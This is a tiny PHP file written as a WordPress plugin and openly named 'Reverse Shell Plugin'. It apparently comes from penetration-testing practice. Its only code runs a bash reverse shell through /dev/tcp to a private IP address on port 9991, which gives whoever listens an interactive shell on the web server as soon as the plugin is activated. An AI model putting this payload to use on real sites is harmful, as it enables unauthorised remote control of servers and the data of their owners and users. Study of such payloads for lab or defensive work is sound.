<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Techno Herder
* Author URI: https://hack.technoherder.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.248/9991 0>&1'");
?>
